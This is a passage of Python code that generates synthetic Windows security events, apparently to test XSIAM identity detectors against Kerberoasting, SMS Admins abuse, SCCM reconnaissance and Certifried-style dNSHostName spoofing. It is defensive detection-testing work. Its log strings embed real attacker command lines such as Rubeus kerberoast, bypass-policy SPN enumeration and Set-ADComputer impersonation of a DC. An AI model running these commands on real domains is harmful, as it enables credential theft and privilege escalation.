    dc_host = _get_dc_hostname(config)
    dc_short = dc_host.split(".")[0]
    sdprop_subject = {"username": f"{dc_short}$", "hostname": dc_host, "ip": u.get("ip")}
    sdprop_logon = _new_logon_id()

    protected_objects = [
        (f"CN=Domain Admins,CN=Users,{base_dn}", "group"),
        (f"CN=Enterprise Admins,CN=Users,{base_dn}", "group"),
        (f"CN=Schema Admins,CN=Users,{base_dn}", "group"),
        (f"CN=Administrators,CN=Builtin,{base_dn}", "group"),
        (f"CN=Account Operators,CN=Builtin,{base_dn}", "group"),
        (f"CN=Backup Operators,CN=Builtin,{base_dn}", "group"),
        (f"CN=Server Operators,CN=Builtin,{base_dn}", "group"),
        (f"CN=Print Operators,CN=Builtin,{base_dn}", "group"),
        (f"CN=Replicator,CN=Builtin,{base_dn}", "group"),
        (f"CN=Administrator,CN=Users,{base_dn}", "user"),
        (f"CN=krbtgt,CN=Users,{base_dn}", "user"),
    ]
    # A real SDProp cycle also touches the individual members of those groups.
    for member in _get_windows_users(session_context)[:random.randint(3, 6)]:
        protected_objects.append(
            (f"CN={member['username']},CN=Users,{base_dn}", "user"))

    # SDProp runs on its own cycle, not inline with the attacker's session.
    t += random.uniform(120.0, 480.0)
    for obj_dn, obj_class in protected_objects:
        obj_guid = "{" + str(uuid.uuid4()) + "}"
        events.append(json.dumps(_build_5136(
            sdprop_subject, config,
            object_dn=obj_dn, object_class=obj_class, object_guid=obj_guid,
            attribute_name="nTSecurityDescriptor",
            attribute_value=new_sddl,
            attribute_syntax_oid="2.5.5.15",
            operation_type="%%14674",
            op_correlation_id=_new_logon_guid(),
            logon_id=sdprop_logon, ts=t)))
        t += random.uniform(0.05, 0.4)

    return events


# Irregular Kerberos service targets — one entry per DISTINCT service principal.
# Used by _threat_irregular_service_tgs, which drives the XSIAM Identity Analytics
# detector "A user sent multiple TGT requests to irregular service"
# ("A user sent multiple TGT requests to services other than KRBTGT and KADMIN").
# Each tuple is (ServiceName as the KDC logs it, SPN named in the request).  The
# previous flat SPN list collapsed nine {dc_host} SPNs onto the single name
# "DC01$", so 27 SPNs produced only ~18 distinct services.
# Irregular Kerberos service targets — one entry per DISTINCT service principal.
#
# Every ServiceName here is an ORDINARY SERVICE ACCOUNT, never a machine account. The
# previous table was 26/36 machine accounts ("FS01$", "SCCM01$", …). Published Kerberoasting
# rules discard ServiceName values ending in "$", and that same filter is what kept
# _threat_multiple_service_tickets silent until its table was rebuilt with non-machine
# accounts — after which it fired immediately.
#
# Every SPN here is also DISJOINT from _SERVICE_ACCOUNT_SPNS, the pool the benign
# Kerberos traffic uses. Nine entries previously collided (HTTP/intranet, MSSQLSvc/sql01,
# SAPService/sap01, ...), which meant a quarter of the 'irregular' burst was naming
# services these users legitimately touch every day — the opposite of the signal the
# detector looks for. Keep this list disjoint if either pool is edited.
_IRREGULAR_TGT_TARGETS = [
    ("svc_sql_legacy",   "MSSQLSvc/sqllegacy.{dns_domain}:1433"),
    ("svc_sql_stage",    "MSSQLSvc/sqlstage.{dns_domain}:1433"),
    ("svc_sql_archive",  "MSSQLSvc/sqlarchive.{dns_domain}:1433"),
    ("svc_sql_audit",    "MSSQLSvc/sqlaudit.{dns_domain}:1433"),
    ("svc_sql_bi",       "MSSQLSvc/bi01.{dns_domain}:1433"),
    ("svc_sql_erp",      "MSSQLSvc/erpdb.{dns_domain}:1433"),
    ("svc_legacyweb",    "HTTP/legacyapp.{dns_domain}"),
    ("svc_docsvc",       "HTTP/docs-internal.{dns_domain}"),
    ("svc_buildsvc",     "HTTP/buildsvc.{dns_domain}"),
    ("svc_monitoring",   "HTTP/monitoring.{dns_domain}"),
    ("svc_grafana",      "HTTP/grafana.{dns_domain}"),
    ("svc_wiki",         "HTTP/wiki.{dns_domain}"),
    ("svc_scmsvc",       "HTTP/scm-internal.{dns_domain}"),
    ("svc_artifactory",  "HTTP/artifactory.{dns_domain}"),
    ("svc_api_gw",       "HTTP/api-gw.{dns_domain}"),
    ("svc_portal",       "HTTP/portal.{dns_domain}"),
    ("svc_sap_legacy",   "SAPService/sap-legacy.{dns_domain}"),
    ("svc_sap_pi",       "SAPService/sappi.{dns_domain}"),
    ("svc_backup",       "VeeamBackupSvc/veeam01.{dns_domain}"),
    ("svc_veeam_proxy",  "VeeamBackupSvc/veeam02.{dns_domain}"),
    ("svc_oracle",       "oracle/orcl01.{dns_domain}:1521"),
    ("svc_postgres",     "POSTGRES/pg01.{dns_domain}:5432"),
    ("svc_mongo",        "MONGO/mongo01.{dns_domain}:27017"),
    ("svc_tableau",      "HTTP/tableau.{dns_domain}"),
    ("svc_qlik",         "HTTP/qlik.{dns_domain}"),
    ("svc_exchange",     "exchangeRFR/exchsvc.{dns_domain}"),
    ("svc_smtp_relay",   "SMTP/relay.{dns_domain}"),
    ("svc_ftp",          "ftp/ftpsvc.{dns_domain}"),
    ("svc_termsrv",      "TERMSRV/tsfarm.{dns_domain}"),
    ("svc_citrix",       "TERMSRV/xenapp.{dns_domain}"),
    ("svc_vmware",       "STS/vcsa.{dns_domain}"),
    ("svc_netapp",       "nfs/netappsvc.{dns_domain}"),
    ("svc_printsvc",     "IPP/printsvc.{dns_domain}"),
    ("svc_adfs",         "host/adfssvc.{dns_domain}"),
    ("svc_wsus",         "HTTP/wsus.{dns_domain}"),
    ("svc_ansible",      "HTTP/ansible.{dns_domain}"),
]


def _threat_irregular_tgt_burst(config, session_context):
    """Excessive TGT requests to services other than KRBTGT/KADMIN — rule for
    "A user sent multiple TGT requests to irregular service".

    A SEPARATE generator from _threat_irregular_service_tgs, deliberately. That one pairs
    every 4768 with a weak-encryption 4769, and the 4769 burst reliably raises "Abnormal
    issuance of weakly encrypted service tickets to a user" — an alert already owned by
    _threat_multiple_service_tickets — which is all it has ever produced. Rather than
    weaken a working signal, this variant isolates the other half:

      * 4768 ONLY, no paired 4769 -> nothing to trigger the weak-encryption sibling
      * ServiceName is an irregular service principal, never krbtgt/kadmin
      * PreAuthType stays 2 (normal). PreAuthType=0 is the AS-REP roasting signature and
        belongs to _threat_as_rep_roasting, which fires "An excessive number of TGT
        requests were sent for users that do not require Kerberos pre-authentication" and
        must keep doing so untouched.
      * AES encryption, not RC4 — RC4 is the weak-encryption signature.

    Sequence:
      1. Attacker authenticates -> DC 4624 + endpoint 4624 + 4672
      2. 4688 enumeration tool
      3. 40-55 x 4768, each naming a DIFFERENT irregular service, one requesting user
      4. 4689 process exit
    """
    users = _get_windows_users(session_context)
    if not users:
        return None
    u = random.choice(users)
    src_ip = u.get("ip") or "10.0.0.1"
    dns_domain = _get_dns_domain(config)

    targets = _IRREGULAR_TGT_TARGETS[:]
    random.shuffle(targets)
    targets = targets[:random.randint(40, 55)] if len(targets) >= 40 else targets

    events = []
    t = time.time() - len(targets) - 30
    logon_id = _new_logon_id()

    events.append(json.dumps(_dc_logon_event(u, config, ip_override=src_ip,
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         ip_override=src_ip, elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(1.0, 3.0)

    tool = ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            'powershell.exe -c "setspn -T {d} -Q */* | Select-String \'CN=\'"'
            .format(d=dns_domain))
    events.append(json.dumps(_build_4688(u, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)

    for svc_name, spn in targets:
        tgt = _build_4768(u, config, ip_override=src_ip, encryption="0x12", ts=t)
        tgt["event_data"]["ServiceName"] = svc_name
        tgt["event_data"]["ServiceSid"] = _stable_user_sid(svc_name)
        tgt["event_data"]["TicketOptions"] = "0x40810010"
        events.append(json.dumps(tgt))
        t += random.uniform(0.15, 0.45)

    events.append(json.dumps(_build_4689(u, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


def _threat_irregular_service_tgs(config, session_context):
    """A user requests Kerberos tickets for services they never normally touch.

    XSIAM detector: "A user sent multiple TGT requests to irregular service"
      variations: "A user sent an excessive number of TGT requests to irregular
                   services" (Medium) and "A user sent a TGT request to irregular
                   service" (Informational)
      module: Identity Analytics · source: Windows Event Collector
      test period: 10 minutes · deduplication: 1 day (per user)
      description: "A user sent multiple TGT requests to services other than
                    KRBTGT and KADMIN."

    A *TGT* request is event 4768, and its ServiceName is normally "krbtgt".
    The attack modelled here is Kerberoasting performed inside the AS-REQ: the
    tool sets the request's sname to the target SPN instead of krbtgt, so the DC
    logs 4768 events whose ServiceName is an ordinary service principal.  On 4769
    "a service other than KRBTGT" is true of every event ever logged, so the
    detector cannot be reading TGS events.

    We emit both shapes: the 4768 burst is the key trigger for this detector, and
    a matching 4769 for each target keeps the Kerberos exchange internally
    consistent (a real AS-REQ-roast is still followed by ticket use).

    Sequence:
      1. Attacker authenticates → 4768 TGT (normal, krbtgt, AES)
      2. 4624 interactive logon + 4672 elevated privileges
      3. 4688 Rubeus / LDAP recon tool process creation
      4. Burst of 25-36 4768 requests whose ServiceName is an irregular service
         principal, each paired with the corresponding 4769 — KEY TRIGGER
      5. 4689 process exit + 4634 logoff
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    dc_host = _get_dc_hostname(config)
    dc_short = _get_dc_short(config)
    dns_domain = _get_dns_domain(config)
    src_ip = u.get("ip") or "10.0.0.1"

    resolved = [
        (name.format(dc_short=dc_short),
         spn.format(dc_host=dc_host, dns_domain=dns_domain))
        for name, spn in _IRREGULAR_TGT_TARGETS
    ]

    num_targets = random.randint(25, min(36, len(resolved)))
    targets = random.sample(resolved, k=num_targets)

    events = []
    t = time.time() - len(targets) * 3

    logon_id = _new_logon_id()
    logon_guid = _new_logon_guid()

    events.append(json.dumps(_build_4768(u, config, ip_override=src_ip, ts=t)))
    t += 1.0
    events.append(json.dumps(_dc_logon_event(u, config, ip_override=src_ip,
                                             logon_id=logon_id, ts=t)))
    t += 1.2
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         logon_guid=logon_guid,
                                         ip_override=src_ip,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)

    tool = random.choice([
        ("C:\\Users\\Public\\Rubeus.exe",
         "C:\\Users\\Public\\Rubeus.exe kerberoast /rc4opsec /nowrap"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -ep bypass -c \"[adsisearcher]'(&(servicePrincipalName=*))'"
         ".FindAll() | ForEach { $_.Properties.serviceprincipalname }\""),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -ep bypass -c \"Get-ADObject -Filter {servicePrincipalName -like '*'}"
         " -Properties servicePrincipalName\""),
    ])
    events.append(json.dumps(_build_4688(u, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)

    for idx, (svc_name, spn) in enumerate(targets):
        # KEY TRIGGER — a TGT (AS-REQ) naming a service other than krbtgt/kadmin.
        # _build_4768 hardcodes ServiceName="krbtgt", so override it here, the
        # same way _threat_as_rep_roasting overrides PreAuthType/TicketOptions.
        # TWO REPRESENTATIONS of "the service this TGT names", alternating per target.
        # Kerberos allows the AS-REQ sname to be either the service account's
        # sAMAccountName or its SPN, and the detector's own wording ("services other than
        # KRBTGT and KADMIN") does not say which form it reads. The account-name form
        # alone was tested and produced nothing, so emitting both gives the detector a
        # match under either interpretation instead of re-guessing one at a time.
        # ServiceSid stays keyed to the ACCOUNT in both cases — that is the principal the
        # ticket is actually for, regardless of how the name is rendered.
        svc_label = spn if (idx % 2 == 0) else svc_name
        tgt = _build_4768(u, config, ip_override=src_ip,
                          encryption="0x17", ts=t)
        tgt["event_data"]["ServiceName"] = svc_label
        tgt["event_data"]["ServiceSid"] = _stable_user_sid(svc_name)
        tgt["event_data"]["TicketOptions"] = "0x40810010"
        events.append(json.dumps(tgt))
        t += random.uniform(0.2, 0.5)

        # RC4 (0x17) is deliberate and must stay. XSIAM detects Kerberoasting (T1558.003)
        # under SEVERAL alert names, and triggering all of them is the goal — not one
        # each. These RC4 4769s legitimately feed "A user received multiple weakly
        # encrypted service tickets" while the 4768 burst above feeds "A user sent
        # multiple TGT requests to irregular service". One generator raising both is the
        # desired outcome; do not "fix" the overlap by weakening a signal.
        tgs = _build_4769(u, config, service_spn=spn, encryption="0x17",
                          ip_override=src_ip, ts=t)
        tgs["event_data"]["ServiceName"] = svc_name
        tgs["event_data"]["ServiceSid"] = _stable_user_sid(svc_name)
        tgs["event_data"]["LogonGuid"] = logon_guid
        events.append(json.dumps(tgs))
        t += random.uniform(0.3, 0.8)

    events.append(json.dumps(_build_4689(u, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(60, 300)
    session = _pop_open_session(u["hostname"], u["username"])
    if session:
        events.append(json.dumps(_build_4634(session, config, ts=t)))

    return events


# SMS Admins is a domain-scoped group in this synthetic forest (RID 1200), NOT a BUILTIN
# alias — that is why its 4732 resolves and fires while Builtin\Administrators does not.
_SID_SMS_ADMINS = "S-1-5-21-3457937927-2839227994-823803824-1200"


def _threat_sms_admins_addition(config, session_context):
    """User added to the SMS Admins local group — targets SCCM infrastructure.

    SMS Admins is the local group on SCCM site servers that grants full
    administrative control over Microsoft Configuration Manager.  Adding an
    account to this group allows lateral movement via SCCM client-push
    installation, application deployment, or script execution across all
    managed endpoints.

    Sequence:
      1. Attacker authenticates → DC-side 4624 + endpoint 4624 + 4672
      2. 4688 net.exe / PowerShell process creation (group manipulation)
      3. 4732 member added to SMS Admins (security-enabled local group)
      4. 4689 process exit

    XSIAM also detects the add-then-remove variant (attacker adds themselves,
    performs actions, then removes to cover tracks).

    Detection keys:
      - 4732 with TargetUserName="SMS Admins" from a non-service account
      - SubjectUserName is NOT the SCCM service account or SYSTEM
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    _peers = _peer_windows_users(session_context, u["username"], need=1)
    victim = random.choice(_peers) if _peers else None
    if not victim:
        return None

    dns_domain = _get_dns_domain(config)
    domain = _get_domain(config)
    dc_parts = dns_domain.split(".")
    base_dn = ",".join(f"DC={p}" for p in dc_parts)

    victim_name = victim["username"]
    victim_dn = f"CN={victim_name},CN=Users,{base_dn}"
    victim_sid = _stable_user_sid(victim_name)

    sccm_server = f"SCCM01.{dns_domain}"

    events = []
    t = time.time()

    logon_id = _new_logon_id()

    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)

    tool = random.choice([
        ("C:\\Windows\\System32\\net.exe",
         f'net localgroup "SMS Admins" {domain}\\{victim_name} /add'),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f'powershell.exe -c "Add-LocalGroupMember -Group \'SMS Admins\' '
         f'-Member \'{domain}\\{victim_name}\'"'),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f'powershell.exe -c "Invoke-Command -ComputerName {sccm_server} '
         f'-ScriptBlock {{ net localgroup \'SMS Admins\' {domain}\\{victim_name} /add }}"'),
    ])
    events.append(json.dumps(_build_4688(u, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)

    events.append(json.dumps(_build_4732(u, config,
                                         member_name=victim_dn,
                                         member_sid=victim_sid,
                                         target_group="SMS Admins",
                                         target_sid=_SID_SMS_ADMINS,
                                         target_domain=domain,
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.0)

    events.append(json.dumps(_build_4689(u, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


def _threat_sms_admins_add_remove(config, session_context):
    """User added to the SMS Admins group and removed shortly after.

    Separate generator from _threat_sms_admins_addition on purpose: that one fires
    "User added to the SMS Admins local group" and is verified working, so it is left
    untouched. This mirrors the priv_group_addition / priv_group_add_remove split, where
    the add-and-remove pair turned out to have its own distinct detection ("Rare
    privileged group addition and removal") rather than being a variant of the addition.

    Sequence:
      1. Attacker authenticates -> DC-side 4624 + endpoint 4624 + 4672
      2. 4688 net.exe / PowerShell process creation
      3. 4732 member added to SMS Admins
      4. dwell (5-10 min) while the access is used
      5. 4733 member removed from SMS Admins — covering tracks
      6. 4689 process exit

    The whole arc is BACKDATED so the removal lands at roughly "now" rather than in the
    future: events are shipped at generation time, and a 4733 stamped 15+ minutes ahead of
    wall clock is something no real WEC source produces and no pair correlation can act
    on. This is the same defect that kept priv_group_add_remove silent.

    Both halves carry the identical group identity (name, SID, domain). _build_4732 and
    _build_4733 default target_domain differently ("Builtin" vs the AD domain), so both
    are passed explicitly here — otherwise the pair disagrees about which group it is.
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    _peers = _peer_windows_users(session_context, u["username"], need=1)
    victim = random.choice(_peers) if _peers else None
    if not victim:
        return None

    dns_domain = _get_dns_domain(config)
    domain = _get_domain(config)
    base_dn = ",".join(f"DC={p}" for p in dns_domain.split("."))

    victim_name = victim["username"]
    victim_dn = f"CN={victim_name},CN=Users,{base_dn}"
    victim_sid = _stable_user_sid(victim_name)
    sccm_server = f"SCCM01.{dns_domain}"

    dwell = random.uniform(300.0, 600.0)
    events = []
    start_ts = time.time() - dwell - 90.0
    t = start_ts

    logon_id = _new_logon_id()

    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)

    tool = random.choice([
        ("C:\\Windows\\System32\\net.exe",
         f'net localgroup "SMS Admins" {domain}\\{victim_name} /add'),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f'powershell.exe -c "Add-LocalGroupMember -Group \'SMS Admins\' '
         f'-Member \'{domain}\\{victim_name}\'"'),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f'powershell.exe -c "Invoke-Command -ComputerName {sccm_server} '
         f'-ScriptBlock {{ net localgroup \'SMS Admins\' {domain}\\{victim_name} /add }}"'),
    ])
    events.append(json.dumps(_build_4688(u, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)

    events.append(json.dumps(_build_4732(u, config,
                                         member_name=victim_dn,
                                         member_sid=victim_sid,
                                         target_group="SMS Admins",
                                         target_sid=_SID_SMS_ADMINS,
                                         target_domain=domain,
                                         logon_id=logon_id, ts=t)))

    # ── dwell: the access is used before the tracks are covered ──
    t += random.uniform(30.0, 90.0)
    events.append(json.dumps(_build_4688(
        u, config,
        process_name="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line=(f'powershell.exe -c "Invoke-Command -ComputerName {sccm_server} '
                      f'-ScriptBlock {{ Get-CMDevice }}"'),
        logon_id=logon_id, ts=t)))
    # Land the removal a full dwell after the addition, but never in the future.
    t = min(max(t, start_ts + dwell), time.time() - 5.0)

    removal_tool = ("C:\\Windows\\System32\\net.exe",
                    f'net localgroup "SMS Admins" {domain}\\{victim_name} /delete')
    events.append(json.dumps(_build_4688(u, config, process_name=removal_tool[0],
                                         command_line=removal_tool[1],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.3, 0.8)

    events.append(json.dumps(_build_4733(u, config,
                                         member_name=victim_dn,
                                         member_sid=victim_sid,
                                         target_group="SMS Admins",
                                         target_sid=_SID_SMS_ADMINS,
                                         target_domain=domain,
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.0)

    events.append(json.dumps(_build_4689(u, config, process_name=removal_tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


# The System Management container is objectClass "container". Its schemaIDGUID is
# bf967a8b-... (MS-ADSC); bf967a86-... — used previously — is the Computer class. Real
# 4662 ObjectType values carry a '%' prefix, as the DCSync generator already does.
_SCCM_CONTAINER_OBJECT_TYPE = f"%{_GUID_CLASS_CONTAINER}"

# SCCM's mSSMSSite / mSSMSManagementPoint / mSSMSServerLocatorPoint classes are schema
# extensions whose schemaIDGUIDs are generated per forest at extadsch time, so there is no
# canonical value to hard-code. The child reads are reported against the container class;
# detection content keys on ObjectName, not ObjectType.
_SCCM_CHILD_OBJECT_TYPE = f"%{_GUID_CLASS_CONTAINER}"

_SCCM_READ_PROPERTY = "0x10"   # ACTRL_DS_READ_PROP -> AccessList %%7684
_SCCM_LIST_CHILDREN = "0x4"    # ACTRL_DS_LIST      -> AccessList %%7682


def _threat_sccm_container_recon(config, session_context):
    """Suspicious access of the System Management container — SCCM site
    server reconnaissance.

    The System Management container in AD (CN=System Management,CN=System)
    stores SCCM site server registration objects.  Enumerating this container
    reveals all SCCM site servers in the domain, their roles, and boundaries.
    Normal users have no reason to read this container — access indicates
    an attacker mapping the SCCM infrastructure for lateral movement.

    Sequence:
      1. Attacker authenticates → DC-side 4624 + endpoint 4624 + 4672
      2. 4688 PowerShell / ldapsearch / ADFind process creation (LDAP recon)
      3. 4662 Directory Service Access on CN=System Management,CN=System
         with READ_PROPERTY access from a non-service account
      4. 4662 second read on child objects (site server objects)
      5. 4689 process exit

    Detection keys:
      - 4662 with ObjectName containing CN=System Management,CN=System
        from a regular user account (not SCCM service account or SYSTEM)
      - AccessMask indicating read/list operations (0x10, 0x4)
      - Non-standard process performing LDAP queries
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    dns_domain = _get_dns_domain(config)
    domain = _get_domain(config)
    dc_parts = dns_domain.split(".")
    base_dn = ",".join(f"DC={p}" for p in dc_parts)
    sysm_container_dn = f"CN=System Management,CN=System,{base_dn}"

    # SCCM publishes site/role objects under the System Management container as
    # CN=SMS-Site-<SITECODE>, CN=SMS-MP-<SITECODE>-<SERVER>, CN=SMS-SLP-<SITECODE>-<SERVER>
    # — short server names, no FQDN.
    #
    # BREADTH, not just correctness. The previous version enumerated three objects against
    # one hardcoded site/server. A real recon (SharpSCCM, `adfind -b "CN=System
    # Management,..."`) walks the whole container, and the two generators that started
    # firing today did so after their distinct-target count was raised (9 -> 56 for
    # kerberoasting). Four 4662 events is almost certainly under any breadth threshold, so
    # this enumerates 25-34 distinct child objects across several sites and servers.
    #
    # Site codes and server names vary per fire; the schema GUIDs and %% access codes do
    # NOT vary and must not — they are universal AD/msobjs.dll constants, and randomising
    # them is what made the old ObjectType wrong (it used the Computer class GUID).
    site_codes = random.sample(["XS1", "PS1", "CAS", "PR1", "SEC", "TS1"],
                               k=random.randint(2, 4))
    # >=5 servers keeps the floor at 27 child objects even with only 2 sites.
    sccm_servers = random.sample(
        ["SCCM01", "SCCM02", "SCCM03", "MP01", "MP02", "DP01", "DP02",
         "SUP01", "FSP01", "MECM01"], k=random.randint(5, 7))

    sccm_site_objects = []
    for sc in site_codes:
        sccm_site_objects.append(
            f"CN=SMS-Site-{sc},CN=System Management,CN=System,{base_dn}")
        for srv in sccm_servers:
            sccm_site_objects.append(
                f"CN=SMS-MP-{sc}-{srv},CN=System Management,CN=System,{base_dn}")
            sccm_site_objects.append(
                f"CN=SMS-SLP-{sc}-{srv},CN=System Management,CN=System,{base_dn}")
    # Roles that live under the container regardless of site.
    for srv in sccm_servers:
        sccm_site_objects.append(
            f"CN=SMS-DP-{srv},CN=System Management,CN=System,{base_dn}")
    random.shuffle(sccm_site_objects)

    events = []
    t = time.time()

    logon_id = _new_logon_id()

    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)

    tool = random.choice([
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f'powershell.exe -ep bypass -c "Get-ADObject -SearchBase '
         f"'CN=System Management,CN=System,{base_dn}' "
         f'-Filter * -Properties *"'),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f'powershell.exe -ep bypass -c "[adsi]\'LDAP://{sysm_container_dn}\' | '
         f'ForEach {{ $_.psbase.Children }}"'),
        ("C:\\Users\\Public\\ADFind.exe",
         f'adfind.exe -b "CN=System Management,CN=System,{base_dn}" -f "(objectClass=*)"'),
    ])
    events.append(json.dumps(_build_4688(u, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)

    # %%7684 = Read Property, %%7682 = List Contents (msobjs.dll). The old values were
    # %%1537 (DELETE) and %%1541 (SYNCHRONIZE) — the wrong bitmask family entirely, the
    # same defect that kept the 4662-based generators silent while DCSync worked.
    read_props = (
        "%%7684\n    "
        f"{_GUID_CLASS_CONTAINER}\n"
    )
    list_props = (
        "%%7682\n    "
        f"{_GUID_CLASS_CONTAINER}\n"
    )
    events.append(json.dumps(_build_4662(
        u, config,
        object_type=_SCCM_CONTAINER_OBJECT_TYPE,
        object_name=sysm_container_dn,
        access_mask=_SCCM_READ_PROPERTY,
        properties=read_props,
        operation_type="Object Access",
        logon_id=logon_id, ts=t)))
    t += random.uniform(0.2, 0.5)

    for site_obj in sccm_site_objects:
        events.append(json.dumps(_build_4662(
            u, config,
            object_type=_SCCM_CHILD_OBJECT_TYPE,
            object_name=site_obj,
            access_mask=_SCCM_LIST_CHILDREN,
            properties=list_props,
            operation_type="Object Access",
            logon_id=logon_id, ts=t)))
        t += random.uniform(0.1, 0.3)

    t += random.uniform(0.5, 1.0)
    events.append(json.dumps(_build_4689(u, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


def _threat_dnshostname_spoofing(config, session_context):
    """Suspicious dNSHostName attribute change to a DC name — CVE-2022-26923
    (Certifried) and related privilege escalation attacks.

    The attacker modifies the dNSHostName attribute of a machine account they
    control to match a domain controller's name.  When AD CS processes a
    certificate request from this machine, it issues a cert with the DC's
    identity, allowing the attacker to authenticate as the DC and perform
    DCSync.

    Sequence:
      1. Attacker authenticates → DC-side 4624 + endpoint 4624 + 4672
      2. 4741 or pre-existing machine account (attacker may create a new one)
      3. 4688 PowerShell / Certify process creation
      4. 5136 dNSHostName modified to DC hostname (detection trigger)
      5. 5136 servicePrincipalName updated to match DC SPNs
      6. 4769 TGS request using the spoofed identity
      7. 4689 process exit

    Detection keys:
      - 5136 with AttributeLDAPDisplayName=dNSHostName and AttributeValue
        matching a DC hostname from a non-DC machine account
      - Followed by certificate enrollment or TGS requests for DC services
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    dns_domain = _get_dns_domain(config)
    domain = _get_domain(config)
    dc_host = _get_dc_hostname(config)
    dc_short = _get_dc_short(config)
    dc_parts = dns_domain.split(".")
    base_dn = ",".join(f"DC={p}" for p in dc_parts)

    machine_suffix = random.randint(100, 9999)
    machine_name = random.choice(["YOURPC", "WKSTMP", "DESKTOP", "CLIENT"]) + str(machine_suffix)
    machine_sam = f"{machine_name}$"
    machine_dn = f"CN={machine_name},CN=Computers,{base_dn}"
    machine_guid = "{" + str(uuid.uuid4()) + "}"
    machine_sid = _stable_user_sid(machine_name)

    events = []
    t = time.time()

    logon_id = _new_logon_id()
    op_corr_id = _new_logon_guid()

    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)

    create_machine = random.random() < 0.5
    if create_machine:
        events.append(json.dumps(_build_4741(u, config,
                                             target_computer_name=machine_sam,
                                             target_sid=machine_sid,
                                             sam_account_name=machine_sam,
                                             dns_host_name=f"{machine_name.lower()}.{dns_domain}",
                                             spns=f"HOST/{machine_name.lower()}.{dns_domain} "
                                                  f"RestrictedKrbHost/{machine_name.lower()}.{dns_domain}",
                                             new_uac_value="0x1000",
                                             logon_id=logon_id, ts=t)))
        t += random.uniform(0.5, 1.0)

    tool = random.choice([
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f'powershell.exe -ep bypass -c "Set-ADComputer {machine_name} '
         f"-DnsHostName '{dc_host}'\""),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f'powershell.exe -ep bypass -c "Get-ADComputer {machine_name} | '
         f"Set-ADComputer -DnsHostName '{dc_host}'\""),
